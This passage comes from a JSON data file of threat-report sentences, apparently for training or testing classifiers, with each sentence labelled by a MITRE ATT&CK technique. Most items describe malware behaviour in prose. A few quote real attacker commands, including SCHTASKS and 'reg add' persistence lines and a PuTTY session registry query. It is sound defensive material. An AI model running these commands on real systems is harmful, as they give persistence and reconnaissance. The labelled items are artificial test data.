    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has used a number of API calls including `VirtualAlloc` `VirtualFree` `LoadLibraryA` `GetProcAddress` and `ExitProcess`. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has maintained persistence by modifying Registry run key value  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "the adversary accessed the company portal with the valid account.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "used different sets of defense evasion and reconnaissance tools such as GMER and Advance Process Termination to manually uninstall antivirus products on the target system.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "has used Win7Elevate to inject malicious code into explorer.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "executes it using rundll32.exe",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "can locate files based on hardcoded file extensions.(Citation: Microsoft WhisperGate January 2022)(Citation: Unit 42 WhisperGate January 2022)(Citation: Cisco Ukraine Wipers January 2022)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Removal of artefacts from the system",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has commands to get information about the victim's name build version serial number and memory usage.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can retrieve files from the local file system.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "can download additional payloads to a target system.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can gather system information from the victims machine including the OS type.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can write its configuration file to Software\\Classes\\scConfig in either HKEY_LOCAL_MACHINE or HKEY_CURRENT_USER.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "During the defense evasion phase, anti-malware and monitoring software is often disabled.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "can download additional plugins files and tools.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "retrieves the hard disk name by calling the CreateFileA to \\\\.\\PHYSICALDRIVE0 API.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has checked for internet connectivity from an infected host before attempting to establish a new TCP connection.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Several  backdoors achieved persistence by adding a Run key.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has been observed being used to download  and the Cobalt Strike Beacon payload onto victims.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors used the `tasklist` command as part of their advanced reconnaissance.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can collect the names of all files and folders in the Program Files directories.(Citation: Cybereason Molerats Dec 2020) ",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has installed a registry based start-up key HKCU\\Software\\microsoft\\windows\\CurrentVersion\\Run to maintain persistence should other methods fail.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to install itself as a service.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "were both designed to turn off Antivirus and Antimalware software.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "can upload and download files to and from the victims machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "collects hard drive content and system configuration information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Enumerates running processes for “Wireshark” and “Sysinternals”",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has the capability to gather the username from the victim's machine.(Citation: Talos Cobalt Group July 2018)",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "During these RDP sessions,",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "download, upload",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "outgoing HTTPS port 443 connections to  and  (the prior domain in reverse).",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "malware creates a scheduled task entitled IE Web Cache to execute a malicious file hourly.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "queries the registry to look for information about Terminal Services.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "which the actor took after logging in to a user’s Microsoft 365 account",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "in a specified separate process that is created and injected.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has the capability to delete files.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Downloading files remotely",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "A module in  allows arbitrary commands to be executed by invoking C:\\Windows\\System32\\cmd.exe.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "uses rundll32 to load various tools on victims including a lateral movement tool named Vminst Cobalt Strike and shellcode.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "has a tool that can copy files to remote machines.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "contains a module that tries to obtain credentials from LSASS similar to . These credentials are used with  and  to help the malware propagate itself across a network.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "lists the systems processes.(Citation: Lazarus RATANKBA)",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "queries the Registry for keys and values.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate Registry values keys and data.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "has been observed collecting victim machine information like OS version drivers volume information and more.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "When the malicious ISAPI filter captures a username matching this variable, it knows to handle the incoming HTTP request as a command to the web shell",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "uses Windows Script Components.(Citation: Unit42 DarkHydrus Jan 2019)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "used dynamic API resolutions to various Windows APIs by leveraging `LoadLibrary()` and `GetProcAddress()`.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "malware can list running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate files and collect associated metadata.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "They switched to C2 encapsulated in HTTPS in Q3 2019.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "!DWN  Downloads a file from a specified URL",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has injected code into target processes via thread local storage callbacks.(Citation: TrendMicro Ursnif Mar 2015)(Citation: TrendMicro PE_URSNIF.A2)",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "and injects it into iexplore.exe using WriteProcessMemory.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "is capable of downloading files including additional modules.(Citation: Palo Alto menuPass Feb 2017)(Citation: JPCERT ChChes Feb 2017)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "it enumerates several known Crypto Wallet directories and looks for files related to crypto currencies by looking for files having “wallet” substring on its file name.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has a command ps to obtain a listing of processes on the system. ",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can use HTTP to communicate with its C2 servers.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has executed the ipconfig /all command.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "adds a shortcut file to the startup folder for persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors collected files and other data from compromised systems.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "can gather victim proxy information.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "downloads a new version of itself once it has installed. It also downloads additional plugins.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Uses EnumWindows API",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has removed files from victim machines.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can disable Avira anti-virus.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "PDB strings containing the 'SyberSpace' username",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has obtained specific Registry keys and values on a compromised host.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "uses GET and POST requests over HTTP or HTTPS for command and control to obtain commands and send ZLIB compressed data back to the C2 server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can disable the system's local proxy settings.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "uses HTTPS for C2.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Use of non-secure default configurations",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "server component can list directory contents.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "scans the victim for files that contain certain keywords and document types including PDF DOC DOCX XLS and XLSX from a list that is obtained from the C2 as a text file. It can also identify logical drives for the infected machine.(Citation: DustySky)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can check for blocklisted process names on a compromised host.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "The paths and registry keys to use",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "This backdoor collects system information, including the operating system version and hostname, and includes functionality to check, upload, and register plugins that can further enhance its capabilities",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "the adversary identifies data of interest from the network of the victim",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "using the Administrator account each time",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "to establish a Remote Desktop Protocol (RDP) session to an internal server",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Collected machine information includes the following:\nRandomly generated GUID\nHostname",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can delete all Registry entries created during its execution.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Malicious actors typically gain entry to organizations’ Microsoft 365 environments by abusing either stolen account credentials",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "collects the hostname of the victim machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate through all open processes to search for any that have the string sql in their process name.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "NetServerEnum to get a list",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can test a connection to a specified network IP address over a specified port number.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can use `cmd.exe` for discovery actions on a targeted system.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "indicating that the user deleted the collected data.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "It will read the next stage payloads, free.plg and main.plg, and inject them into dllhost.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "is capable of injecting code into the APC queue of a created  process as part of an Early Bird injection.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can use HTTP or HTTPS for command and control to hard-coded C2 servers.(Citation: F-Secure The Dukes)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "func_GetGraphicCards",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Figure 2: Process chain for the first part of the campaign Although the actual VBS script changed from sample to sample, with different levels of obfuscation and different ways of invoking the next stage of process tree, its final purpose remained same: invoking PowerShell to decode the Base64 encoded PowerShell command in the INI file that was dropped earlier by the macro, and executing it",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Disabling Windows Defender notifications, Task Manager and Command Prompt",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "can execute commands via an interactive command shell.  uses batch scripts for various purposes including to restart and uninstall itself.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has identified the OS version of a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors relied on a victim to enable macros within a malicious Microsoft Word document likely sent via email.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has injected the malware DLL into a target process.(Citation: McAfee Maze March 2020)",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "uploads and downloads files to and from the victims machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has a command to download a file.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "first-stage downloader resolved various Windows libraries and APIs including LoadLibraryA() GetProcAddress() and CreateProcessA().",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "creates a backdoor through which remote attackers can read data from files.(Citation: Symantec Trojan.Hydraq Jan 2010)",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has a command to get the victim's domain and NetBIOS name.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "creates a scheduled task for persistence.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "has used `SCHTASKS /CREATE /SC DAILY /TN StartDVL /TR [path to self] /ST 10:00` to establish persistence.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "checks the running processes on the victims machine.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can collect the OS and build version on a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "collects files from the local system.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "OSinfo: OSInfo is a general purpose, system information gathering tool",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "ARP table",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "the malware enumerates the running processes on the system and compiles a list of process names and IDs.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can launch itself from a hollowed svchost.exe process.(Citation: Secureworks BRONZE PRESIDENT December 2019)(Citation: Trend Micro DRBControl February 2020)",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "using a batch script",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can collect the TCP/IP DNS DHCP and network adapter configuration on a compromised host via ipconfig.exe /all.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has used public sites such as github.com and sendspace.com to upload files and then download them to victim computers.(Citation: PTSecurity Cobalt Group Aug 2017)(Citation: PTSecurity Cobalt Dec 2016) The group's JavaScript backdoor is also capable of downloading files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used malware to collect information on network interfaces including the MAC address.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has provided the ability to execute shell commands on a compromised host.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "interacts with remote endpoints via WMI",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "the threat actor connected to the victim’s O365 tenant",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to use the CreatePipe API to add a sub-process for execution via .",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can achieve persistence by adding itself to the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run Registry key.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "calling the RegisterClass function prior to calling CreateWindow.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has the capability to delete files off the victims machine.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can communicate with C2 via HTTP POST requests.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can download additional payloads onto a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used a task XML file named mssch.xml to run an IronPython script when a user logs in or when specific system events are created.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "backdoor deletes files after they have been successfully uploaded to C2 servers.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "the Content-Key, which is a custom HTTP header whose value corresponds to a hash generated out of the HTTP header.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "the running processes using  CreateToolhelp32Snapshot and  Process32Next",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "cyber actors have been observed using the mv command to export files into a location",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors executed `/c cd /d c:\\windows\\temp\\ & reg query HKEY_CURRENT_USER\\Software\\<username>\\PuTTY\\Sessions\\` to detect recent PuTTY sessions likely to further lateral movement.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "has been observed deleting its original launcher after execution.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Variants of  have used rundll32.exe in Registry values added to establish persistence.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "via the MoveFileExW or CopyFileW Windows API.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to discover processes including `Bka.exe` and `BkavUtil.exe`.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can delete itself or specified files.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can identify the IP of a compromised system.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can list running processes on the localhost.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "deleting files",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can identify the user on a targeted system.(Citation: Proofpoint Operation Transparent Tribe March 2016)(Citation: Kaspersky Transparent Tribe August 2020)",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can obtain information about network configuration including the routing table ARP cache and DNS cache.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "It enumerates files and directories",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "adds a sub-key under several Registry run keys.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can store configuration strings keylogger and output of components in the Registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": " query user",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has used scheduled tasks to execute additional payloads and to gain persistence on a compromised host.(Citation: Cybereason Valak May 2020)(Citation: Unit 42 Valak July 2020)",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "creates a backdoor through which remote attackers can retrieve information such as hostname and free disk space.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can transfer files from C2.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used scheduled tasks to add persistence. ",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "RPC backdoors have used cmd.exe to execute commands.(Citation: ESET Turla PowerShell May 2019)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "uses HTTPS to communicate with its C2 servers to get malware updates modules that perform most of the malware logic and various configuration files.(Citation: S2 Grupo TrickBot June 2017)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has used the systeminfo command on a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "used ipconfig /all to obtain information about the victim network configuration. The group also ran a modified version of  to identify available NetBIOS name servers.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "adds Run key entries in the Registry to establish persistence.(Citation: Lastline PlugX Analysis)(Citation: PWC Cloud Hopper Technical Annex April 2017)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has used compromised VPN accounts to gain access to victim systems.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors collected the computer name OS and other system information using `cmd /c systeminfo > %temp%\\ temp.ini`.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The malware is a DLL that is launched using rundll32.exe:",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "exfiltrate proprietary or confidential information,",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "searches for specified files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to query the Registry to detect a key specific to VMware.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "modified the registry using the command reg add HKEY_CURRENT_USER\\Environment /v UserInitMprLogonScript /t REG_SZ /d [file path] for persistence.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "From a persistence point of view, scheduled tasks",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "fprii.net 185.130.212.254 Domain used for spear phish sender e-mail address and to host malicious documents",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "the command line dump of the memory:\ncmd /c",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate and search for files and directories.(Citation: PWC Cloud Hopper Technical Annex April 2017)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Revenge RAT is a simple and freely available Remote Access Trojan that automatically gathers system information before allowing threat actors to remotely access system components such as webcams, microphones, and various other utilities",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "by calling WinHTTPGetProxyForUrlEx and WinHTTPCreateProxyResolver",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "contains a modified version of  to help gather credentials that are later used for lateral movement.(Citation: Talos Nyetya June 2017)(Citation: US-CERT NotPetya 2017)",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The code will gather the information and format the list using the following HTML to create a table: <table> <tr><td>Type</td><td>Owner</td><td>Permissions</td><td>Created</td><td>Modificated</td><td>Size</td><td>Path</td></tr> <tr><td>[fileType]</td><td>[fileOwnerAccountName]</td><td>[number filePosixPermissions]</td><td>[fileCreationDate]</td><td>[fileModificationDate]</td><td>[fileSize]</td><td>[file path?]</td></tr> … </table>    Table 1 Commands available within XAgent OSX The ‘showBackupIosFolder’ command is rather interesting, as it allows the threat actors to determine if a compromised system was used to backup an IOS device, such as an iPhone or iPad",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has lured victims into opening macro-enabled Word documents for execution.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded additional scripts that build and run Monero cryptocurrency miners.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to identify running processes on an infected host.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has used a tool to query the Registry for proxy settings.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "used the command prompt to launch commands on the victims machine.(Citation: FireEye FIN7 Aug 2018) ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has collected data and other information from a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "can use protocols like HTTP/HTTPS for command and control traffic.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Modify and query the Windows registry",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has used a reconnaissance module that can be used to retrieve information about a victim's computer including the resolution of the workstation .",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Delivery document The delivery document contains a macro that downloads an executable from a remote server",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "downloads and executes additional malware from either a Web address or a Microsoft OneDrive account.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Strike beacons accessing LSASS on multiple occasions, on almost every compromised host.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "has used legitimate credentials to gain initial access maintain access and exfiltrate data from a victim network. The group has specifically used credentials stolen through a spearphishing email to login to the DCCC network. The group has also leveraged default manufacturer's passwords to gain initial access to corporate networks via IoT devices such as a VOIP phone printer and video decoder.(Citation: Trend Micro Pawn Storm April 2017)(Citation: DOJ GRU Indictment Jul 2018)(Citation: Microsoft STRONTIUM Aug 2019)",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "lists the current processes running.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "creates a backdoor through which remote attackers can retrieve lists of files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can identify the process that owns remote connections.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "actors to execute directory traversal attacks",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has used `cmd.exe` and `.bat` scripts for execution.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "communicates with its C2 server over HTTP.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has made their XMRIG payloads persistent as a Windows Service.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "has used various forms of spearphishing in attempts to get users to open attachments.(Citation: US-CERT TA18-074A)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "By extracting the syscalls, and executing them manually, the malware can use the API of the operating system,",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "used whoami and query user to obtain information about the victim user.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has used legitimate VPN RDP Citrix or VNC credentials to maintain access to a victim environment.(Citation: FireEye Respond Webinar July 2017)(Citation: DarkReading FireEye FIN5 Oct 2015)",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "uses wmic.exe to delete shadow copies.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
